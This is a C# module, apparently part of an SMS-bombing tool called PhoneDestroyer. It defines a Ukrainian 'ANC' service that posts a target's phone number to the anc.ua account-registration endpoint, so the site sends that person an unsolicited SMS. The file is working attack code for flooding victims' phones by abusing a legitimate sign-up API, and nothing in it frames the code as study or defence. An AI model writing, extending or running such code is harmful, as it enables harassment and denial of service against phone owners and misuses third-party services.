using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services.UA
{
    internal class ANC : Service
    {
        public override string Name => "ANC";

        public override CountryCodes AvailableFor => CountryCodes.UA;

        public override async Task<bool> SendSmsAsync()
        {
            var resp = await Client.PostAsync("https://anc.ua/authorization/auth/v2/register",
                new StringContent($"{{\"login\":\"+{(int)CountryCodes.UA}{PhoneNumber}\"}}", Encoding.UTF8, "application/json"));
            if (LogDebug)
                Logger.LogDebug(await resp.Content.ReadAsStringAsync());
            return resp.IsSuccessStatusCode;
        }
    }
}
